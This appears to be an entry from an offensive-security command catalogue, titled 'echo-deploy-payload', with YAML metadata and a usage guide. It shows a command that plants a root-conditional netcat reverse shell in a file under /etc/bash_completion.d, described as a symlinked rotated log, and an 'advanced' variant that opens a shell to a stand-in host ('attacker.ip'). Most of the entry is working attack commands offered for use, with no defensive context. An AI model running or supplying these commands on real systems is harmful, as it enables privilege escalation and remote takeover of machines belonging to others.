---
data: >-
  echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi"
  > /etc/bash_completion.d/something.log.1.gz
tags:
  - payload
  - shell
type: command
output: File overwritten
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:56.971Z'
id: 4511291b-83db-4f4b-aef6-dec9dcd7546a
verified: false
validated: true
submitted: true
---
# echo-deploy-payload

## Command

```bash
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
```

## Description

Writes a conditional reverse shell script to the symlinked rotated log file, which executes nc as root if uid=0.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| echo "script" | Bash code for uid check and nc shell | Yes |
| > /path/to/file | Target file in symlinked dir | Yes |

## Examples

### Basic Usage

```bash
echo "if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash localhost 3333 &); fi" > /etc/bash_completion.d/something.log.1.gz
```

### Advanced Usage

```bash
echo "#!/bin/bash
if [ `id -u` -eq 0 ]; then nc -e /bin/sh attacker.ip 4444; fi" > /target/payload
```

## Expected Output

No output; file contains the script.

## Related

- [[commands/nc-listen]]
- [[procedures/Deploy-Reverse-Shell-Payload]]
